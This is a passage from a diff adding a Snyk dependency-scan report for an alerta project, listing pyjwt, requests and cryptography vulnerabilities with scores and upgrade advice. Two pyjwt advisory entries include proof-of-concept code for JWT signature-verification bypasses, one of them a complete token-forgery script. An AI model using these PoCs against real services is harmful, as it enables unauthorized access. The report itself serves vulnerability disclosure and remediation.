scheme validation\nheader = pyjwt.get_unverified_header(token)\nclient = PyJWKClient(header[\"jku\"])      # <-- accepts file:// silently\nkey_obj = client.get_signing_key_from_jwt(token)\ndecoded = pyjwt.decode(token, key_obj.key, algorithms=[\"RS256\"],\n                       audience=\"target-app\")\nprint(\"Token verified:\", decoded)\n# Output: Token verified: {'sub': 'attacker', 'aud': 'target-app', ...}\n```\n## Remediation\nUpgrade `pyjwt` to version 2.13.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/jpadilla/pyjwt/security/advisories/GHSA-993g-76c3-p5m4)\n- [GitHub Commit](https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81)\n",
+      "epssDetails": {
+        "percentile": "0.07768",
+        "probability": "0.00181",
+        "modelVersion": "v2026.06.15"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-48522"
+        ],
+        "CWE": [
+          "CWE-441"
+        ],
+        "GHSA": [
+          "GHSA-993g-76c3-p5m4"
+        ]
+      },
+      "packageName": "pyjwt",
+      "proprietary": false,
+      "creationTime": "2026-05-29T07:42:43.584532Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2026-05-28T16:50:13.792000Z",
+      "exploitDetails": {
+        "sources": [
+          "Snyk"
+        ],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Proof of Concept",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Proof of Concept",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "pip",
+      "publicationTime": "2026-05-29T07:42:43.773556Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2026-06-24T11:12:46.188502Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "low",
+      "from": [
+        "alerta__alerta@0.0.0",
+        "pyjwt@2.12.1"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "pyjwt",
+      "version": "2.12.1"
+    },
+    {
+      "id": "SNYK-PYTHON-PYJWT-17054902",
+      "title": "Improper Verification of Cryptographic Signature",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N/E:P",
+      "credit": [
+        "Unknown"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,2.13.0)"
+        ]
+      },
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "2.13.0"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "python",
+      "severity": "medium",
+      "cvssScore": 5.3,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "pyjwt",
+      "references": [
+        {
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-jq35-7prp-9v3f",
+          "title": "GitHub Advisory"
+        },
+        {
+          "url": "https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81",
+          "title": "GitHub Commit"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
+          "cvssV3BaseScore": 5.4,
+          "modificationTime": "2026-06-05T09:54:01.385399Z"
+        },
+        {
+          "assigner": "SUSE",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
+          "cvssV3BaseScore": 5.4,
+          "modificationTime": "2026-06-24T11:13:01.388342Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N/E:P",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 5.3,
+          "cvssVersion": "4.0",
+          "modificationTime": "2026-06-24T11:13:02.152713Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N/E:P",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 5.4,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-06-24T11:13:02.152713Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "baseScore": 5.4,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-06-05T09:54:01.385399Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
+          "assigner": "SUSE",
+          "severity": "medium",
+          "baseScore": 5.4,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-06-24T11:13:01.388342Z"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature via the `jwt.decode` or `jwt.decode_complete` functions when used with a `PyJWK` key. An attacker can bypass algorithm restrictions and gain unauthorized access to protected resources by signing a token with a disallowed algorithm, setting an allowed algorithm in the JWT header, and leveraging control over a registered JWK/JWKS private key.\n## PoC\n```python\nimport json\nimport jwt\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives.serialization import Encoding, PublicFormat\nfrom jwt.api_jwk import PyJWK\nfrom jwt.algorithms import RSAAlgorithm\nfrom jwt.utils import base64url_encode\n\n# Generate an RSA keypair controlled by the attacker.\npriv = rsa.generate_private_key(public_exponent=65537, key_size=2048)\npub = priv.public_key()\npub_pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)\n\n# Build a PyJWK from the public key.\n# With an RSA JWK and no explicit alg, PyJWK binds to RS256 by default.\njwk = PyJWK.from_json(RSAAlgorithm.to_jwk(pub))\n\n# Create a token whose protected header claims RS512.\nheader = {\"typ\": \"JWT\", \"alg\": \"RS512\"}\npayload = {\"sub\": \"alice\"}\n\nheader_b64 = base64url_encode(\n    json.dumps(header, separators=(\",\", \":\"), sort_keys=True).encode()\n)\npayload_b64 = base64url_encode(\n    json.dumps(payload, separators=(\",\", \":\")).encode()\n)\nsigning_input = b\".\".join([header_b64, payload_b64])\n\n# Sign the RS512-labelled token with RS256 instead.\nsig = RSAAlgorithm(RSAAlgorithm.SHA256).sign(signing_input, priv)\ntoken = b\".\".join([header_b64, payload_b64, base64url_encode(sig)]).decode()\n\nprint(\"token:\", token)\nprint(\"PyJWK path:\")\nprint(jwt.decode(token, jwk, algorithms=[\"RS512\"]))\n\nprint(\"PEM path:\")\ntry:\n    print(jwt.decode(token, pub_pem, algorithms=[\"RS512\"]))\nexcept Exception as e:\n    print(f\"{type(e).__name__}: {e}\")\n```\n## Remediation\nUpgrade `pyjwt` to version 2.13.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/jpadilla/pyjwt/security/advisories/GHSA-jq35-7prp-9v3f)\n- [GitHub Commit](https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81)\n",
+      "epssDetails": {
+        "percentile": "0.02650",
+        "probability": "0.00127",
+        "modelVersion": "v2026.06.15"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-48523"
+        ],
+        "CWE": [
+          "CWE-347"
+        ],
+        "GHSA": [
+          "GHSA-jq35-7prp-9v3f"
+        ]
+      },
+      "packageName": "pyjwt",
+      "proprietary": false,
+      "creationTime": "2026-05-29T07:44:32.027065Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2026-05-28T16:50:17.233000Z",
+      "exploitDetails": {
+        "sources": [
+          "Snyk"
+        ],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Proof of Concept",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Proof of Concept",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "pip",
+      "publicationTime": "2026-05-29T07:44:32.232509Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2026-06-24T11:13:02.152713Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "medium",
+      "from": [
+        "alerta__alerta@0.0.0",
+        "pyjwt@2.12.1"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "pyjwt",
+      "version": "2.12.1"
+    },
+    {
+      "id": "SNYK-PYTHON-REQUESTS-15763443",
+      "title": "Insecure Temporary File",
+      "CVSSv3": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:N/I:H/A:N",
+      "credit": [
+        "Jaycelation"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,2.33.0)"
+        ]
+      },
+      "exploit": "Not Defined",
+      "fixedIn": [
+        "2.33.0"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "python",
+      "severity": "medium",
+      "cvssScore": 4.1,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "requests",
+      "references": [
+        {
+          "url": "https://github.com/psf/requests/commit/66d21cb07bd6255b1280291c4fafb71803cdb3b7",
+          "title": "GitHub Commit"
+        },
+        {
+          "url": "https://github.com/psf/requests/security/advisories/GHSA-gc5v-m9x4-r6x2",
+          "title": "Maintainer's Advisory"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N",
+          "cvssV3BaseScore": 4.7,
+          "modificationTime": "2026-03-29T08:59:54.578156Z"
+        },
+        {
+          "assigner": "NVD",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+          "cvssV3BaseScore": 5.5,
+          "modificationTime": "2026-03-31T01:21:52.868372Z"
+        },
+        {
+          "assigner": "SUSE",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+          "cvssV3BaseScore": 5.5,
+          "modificationTime": "2026-05-02T14:41:29.183085Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:L/AC:H/AT:N/PR:L/UI:P/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 4.1,
+          "cvssVersion": "4.0",
+          "modificationTime": "2026-06-24T02:02:06.573078Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:N/I:H/A:N",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 4.4,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-06-24T02:02:06.573078Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N",
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "baseScore": 4.7,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-03-29T08:59:54.578156Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+          "assigner": "NVD",
+          "severity": "medium",
+          "baseScore": 5.5,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-03-31T01:21:52.868372Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+          "assigner": "SUSE",
+          "severity": "medium",
+          "baseScore": 5.5,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-05-02T14:41:29.183085Z"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Insecure Temporary File via the `extract_zipped_paths` function. An attacker can leverage unauthorized file replacement by pre-creating a malicious file in the system's temporary directory prior to extraction.\r\n\r\n**Note:** Only applications that call extract_zipped_paths() directly are impacted.\r\n\r\n## Workaround \r\nThis vulnerability can be mitigated by setting the `TMPDIR` environment variable to a directory with restricted write access.\n## Remediation\nUpgrade `requests` to version 2.33.0 or higher.\n## References\n- [GitHub Commit](https://github.com/psf/requests/commit/66d21cb07bd6255b1280291c4fafb71803cdb3b7)\n- [Maintainer's Advisory](https://github.com/psf/requests/security/advisories/GHSA-gc5v-m9x4-r6x2)\n",
+      "epssDetails": {
+        "percentile": "0.07900",
+        "probability": "0.00182",
+        "modelVersion": "v2026.06.15"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-25645"
+        ],
+        "CWE": [
+          "CWE-377"
+        ],
+        "GHSA": [
+          "GHSA-5qvp-pr9f-2g2v",
+          "GHSA-gc5v-m9x4-r6x2"
+        ]
+      },
+      "packageName": "requests",
+      "proprietary": false,
+      "creationTime": "2026-03-25T17:32:25.715695Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2026-03-25T16:56:28Z",
+      "exploitDetails": {
+        "sources": [],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Not Defined",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Not Defined",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "pip",
+      "publicationTime": "2026-03-25T17:32:25.924103Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2026-06-24T02:02:06.573078Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "medium",
+      "from": [
+        "alerta__alerta@0.0.0",
+        "requests@2.32.5"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "requests",
+      "version": "2.32.5"
+    },
+    {
+      "id": "SNYK-PYTHON-REQUESTS-15763443",
+      "title": "Insecure Temporary File",
+      "CVSSv3": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:N/I:H/A:N",
+      "credit": [
+        "Jaycelation"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,2.33.0)"
+        ]
+      },
+      "exploit": "Not Defined",
+      "fixedIn": [
+        "2.33.0"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "python",
+      "severity": "medium",
+      "cvssScore": 4.1,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "requests",
+      "references": [
+        {
+          "url": "https://github.com/psf/requests/commit/66d21cb07bd6255b1280291c4fafb71803cdb3b7",
+          "title": "GitHub Commit"
+        },
+        {
+          "url": "https://github.com/psf/requests/security/advisories/GHSA-gc5v-m9x4-r6x2",
+          "title": "Maintainer's Advisory"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N",
+          "cvssV3BaseScore": 4.7,
+          "modificationTime": "2026-03-29T08:59:54.578156Z"
+        },
+        {
+          "assigner": "NVD",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+          "cvssV3BaseScore": 5.5,
+          "modificationTime": "2026-03-31T01:21:52.868372Z"
+        },
+        {
+          "assigner": "SUSE",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+          "cvssV3BaseScore": 5.5,
+          "modificationTime": "2026-05-02T14:41:29.183085Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:L/AC:H/AT:N/PR:L/UI:P/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 4.1,
+          "cvssVersion": "4.0",
+          "modificationTime": "2026-06-24T02:02:06.573078Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:N/I:H/A:N",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 4.4,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-06-24T02:02:06.573078Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N",
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "baseScore": 4.7,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-03-29T08:59:54.578156Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+          "assigner": "NVD",
+          "severity": "medium",
+          "baseScore": 5.5,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-03-31T01:21:52.868372Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+          "assigner": "SUSE",
+          "severity": "medium",
+          "baseScore": 5.5,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-05-02T14:41:29.183085Z"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Insecure Temporary File via the `extract_zipped_paths` function. An attacker can leverage unauthorized file replacement by pre-creating a malicious file in the system's temporary directory prior to extraction.\r\n\r\n**Note:** Only applications that call extract_zipped_paths() directly are impacted.\r\n\r\n## Workaround \r\nThis vulnerability can be mitigated by setting the `TMPDIR` environment variable to a directory with restricted write access.\n## Remediation\nUpgrade `requests` to version 2.33.0 or higher.\n## References\n- [GitHub Commit](https://github.com/psf/requests/commit/66d21cb07bd6255b1280291c4fafb71803cdb3b7)\n- [Maintainer's Advisory](https://github.com/psf/requests/security/advisories/GHSA-gc5v-m9x4-r6x2)\n",
+      "epssDetails": {
+        "percentile": "0.07900",
+        "probability": "0.00182",
+        "modelVersion": "v2026.06.15"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-25645"
+        ],
+        "CWE": [
+          "CWE-377"
+        ],
+        "GHSA": [
+          "GHSA-5qvp-pr9f-2g2v",
+          "GHSA-gc5v-m9x4-r6x2"
+        ]
+      },
+      "packageName": "requests",
+      "proprietary": false,
+      "creationTime": "2026-03-25T17:32:25.715695Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2026-03-25T16:56:28Z",
+      "exploitDetails": {
+        "sources": [],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Not Defined",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Not Defined",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "pip",
+      "publicationTime": "2026-03-25T17:32:25.924103Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2026-06-24T02:02:06.573078Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "medium",
+      "from": [
+        "alerta__alerta@0.0.0",
+        "requests-hawk@1.2.1",
+        "requests@2.32.5"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "requests",
+      "version": "2.32.5"
+    }
+  ],
+  "ok": false,
+  "dependencyCount": 33,
+  "org": "wuwuyn",
+  "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
+  "isPrivate": true,
+  "licensesPolicy": {
+    "severities": {},
+    "orgLicenseRules": {
+      "AGPL-1.0": {
+        "licenseType": "AGPL-1.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "AGPL-3.0": {
+        "licenseType": "AGPL-3.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "Artistic-1.0": {
+        "licenseType": "Artistic-1.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "Artistic-2.0": {
+        "licenseType": "Artistic-2.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "CDDL-1.0": {
+        "licenseType": "CDDL-1.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "CPOL-1.02": {
+        "licenseType": "CPOL-1.02",
+        "severity": "high",
+        "instructions": ""
+      },
+      "EPL-1.0": {
+        "licenseType": "EPL-1.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "GPL-2.0": {
+        "licenseType": "GPL-2.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "GPL-3.0": {
+        "licenseType": "GPL-3.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "LGPL-2.0": {
+        "licenseType": "LGPL-2.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "LGPL-2.1": {
+        "licenseType": "LGPL-2.1",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "LGPL-3.0": {
+        "licenseType": "LGPL-3.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "MPL-1.1": {
+        "licenseType": "MPL-1.1",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "MPL-2.0": {
+        "licenseType": "MPL-2.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "MS-RL": {
+        "licenseType": "MS-RL",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "SimPL-2.0": {
+        "licenseType": "SimPL-2.0",
+        "severity": "high",
+        "instructions": ""
+      }
+    }
+  },
+  "packageManager": "pip",
+  "ignoreSettings": {
+    "adminOnly": false,
+    "reasonRequired": false,
+    "disregardFilesystemIgnores": false
+  },
+  "summary": "9 vulnerable dependency paths",
+  "remediation": {
+    "unresolved": [
+      {
+        "id": "SNYK-PYTHON-CRYPTOGRAPHY-15953315",
+        "title": "Out-of-bounds Write",
+        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
+        "credit": [
+          "Unknown"
+        ],
+        "semver": {
+          "vulnerable": [
+            "[45.0.0, 46.0.7)"
+          ]
+        },
+        "exploit": "Not Defined",
+        "fixedIn": [
+          "46.0.7"
+        ],
+        "patches": [],
+        "insights": {
+          "triageAdvice": null
+        },
+        "language": "python",
+        "severity": "medium",
+        "cvssScore": 6.3,
+        "functions": [],
+        "malicious": false,
+        "isDisputed": false,
+        "moduleName": "cryptography",
+        "references": [
+          {
+            "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-p423-j2cm-9vmq",
+            "title": "GitHub Advisory"
+          },
+          {
+            "url": "https://github.com/pyca/cryptography/commit/622d672e429a7cff836a23c5903683dbec1901f5",
+            "title": "GitHub Commit"
+          }
+        ],
+        "cvssDetails": [
+          {
+            "assigner": "Red Hat",
+            "severity": "high",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
+            "cvssV3BaseScore": 7.3,
+            "modificationTime": "2026-05-14T10:08:52.101723Z"
+          },
+          {
+            "assigner": "NVD",
+            "severity": "critical",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+            "cvssV3BaseScore": 9.8,
+            "modificationTime": "2026-04-15T18:16:31.005050Z"
+          }
+        ],
+        "cvssSources": [
+          {
+            "type": "primary",
+            "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:L/SC:N/SI:N/SA:N",
+            "assigner": "Snyk",
+            "severity": "medium",
+            "baseScore": 6.3,
+            "cvssVersion": "4.0",
+            "modificationTime": "2026-07-01T02:01:20.004106Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
+            "assigner": "Snyk",
+            "severity": "medium",
+            "baseScore": 4.8,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-07-01T02:01:20.004106Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
+            "assigner": "Red Hat",
+            "severity": "high",
+            "baseScore": 7.3,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-05-14T10:08:52.101723Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+            "assigner": "NVD",
+            "severity": "critical",
+            "baseScore": 9.8,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-04-15T18:16:31.005050Z"
+          }
+        ],
+        "description": "## Overview\n\nAffected versions of this package are vulnerable to Out-of-bounds Write in the `update` function when non-contiguous buffers are provided as input. An attacker can cause memory corruption or unintended behavior by supplying specially crafted non-contiguous buffers to APIs that accept Python buffers. \r\n\r\n**Note:** This is only exploitable if the Python version is greater than 3.11.\n## Remediation\nUpgrade `cryptography` to version 46.0.7 or higher.\n## References\n- [GitHub Advisory](https://github.com/pyca/cryptography/security/advisories/GHSA-p423-j2cm-9vmq)\n- [GitHub Commit](https://github.com/pyca/cryptography/commit/622d672e429a7cff836a23c5903683dbec1901f5)\n",
+        "epssDetails": {
+          "percentile": "0.46581",
+          "probability": "0.00652",
+          "modelVersion": "v2026.06.15"
+        },
+        "identifiers": {
+          "CVE": [
+            "CVE-2026-39892"
+          ],
+          "CWE": [
+            "CWE-787"
+          ],
+          "GHSA": [
+            "GHSA-p423-j2cm-9vmq"
+          ]
+        },
+        "packageName": "cryptography",
+        "proprietary": false,
+        "creationTime": "2026-04-09T08:07:31.859112Z",
+        "functions_new": [],
+        "alternativeIds": [],
+        "disclosureTime": "2026-04-08T19:23:08Z",
+        "exploitDetails": {
+          "sources": [],
+          "maturityLevels": [
+            {
+              "type": "secondary",
+              "level": "Not Defined",
+              "format": "CVSSv3"
+            },
+            {
+              "type": "primary",
+              "level": "Not Defined",
+              "format": "CVSSv4"
+            }
+          ]
+        },
+        "packageManager": "pip",
+        "publicationTime": "2026-04-09T13:10:50.293872Z",
+        "severityBasedOn": "CVSS",
+        "modificationTime": "2026-07-01T02:01:20.004106Z",
+        "socialTrendAlert": false,
+        "packagePopularityRank": 99,
+        "from": [
+          "alerta__alerta@0.0.0",
+          "cryptography@46.0.6"
+        ],
+        "upgradePath": [],
+        "isUpgradable": false,
+        "isPatchable": false,
+        "isPinnable": true,
+        "isRuntime": false,
+        "name": "cryptography",
+        "version": "46.0.6",
+        "severityWithCritical": "medium"
+      },
+      {
+        "id": "SNYK-PYTHON-CRYPTOGRAPHY-17344551",
+        "title": "Out-of-bounds Read",
+        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "credit": [
+          "Frank Buss"
+        ],
+        "semver": {
+          "vulnerable": [
+            "[0.5,48.0.1)"
+          ]
+        },
+        "exploit": "Not Defined",
+        "fixedIn": [
+          "48.0.1"
+        ],
+        "patches": [],
+        "insights": {
+          "triageAdvice": null
+        },
+        "language": "python",
+        "severity": "high",
+        "cvssScore": 8.7,
+        "functions": [],
+        "malicious": false,
+        "isDisputed": false,
+        "moduleName": "cryptography",
+        "references": [
+          {
+            "url": "https://github.com/openssl/openssl/commit/e734e38ab606c62de2ee9410cb3222b99e6fc2e3",
+            "title": "GitHub Commit"
+          },
+          {
+            "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-537c-gmf6-5ccf",
+            "title": "GitHub Security Advisory"
+          },
+          {
+            "url": "https://openssl-library.org/news/secadv/20260609.txt",
+            "title": "Vulnerability Advisory"
+          }
+        ],
+        "cvssDetails": [
+          {
+            "assigner": "SUSE",
+            "severity": "low",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+            "cvssV3BaseScore": 3.7,
+            "modificationTime": "2026-06-16T11:02:04.287862Z"
+          },
+          {
+            "assigner": "Red Hat",
+            "severity": "medium",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:N/A:H",
+            "cvssV3BaseScore": 5,
+            "modificationTime": "2026-06-11T05:27:06.815158Z"
+          }
+        ],
+        "cvssSources": [
+          {
+            "type": "primary",
+            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 8.7,
+            "cvssVersion": "4.0",
+            "modificationTime": "2026-07-10T02:01:07.616348Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 7.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-07-10T02:01:07.616348Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+            "assigner": "SUSE",
+            "severity": "low",
+            "baseScore": 3.7,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-06-16T11:02:04.287862Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:N/A:H",
+            "assigner": "Red Hat",
+            "severity": "medium",
+            "baseScore": 5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-06-11T05:27:06.815158Z"
+          }
+        ],
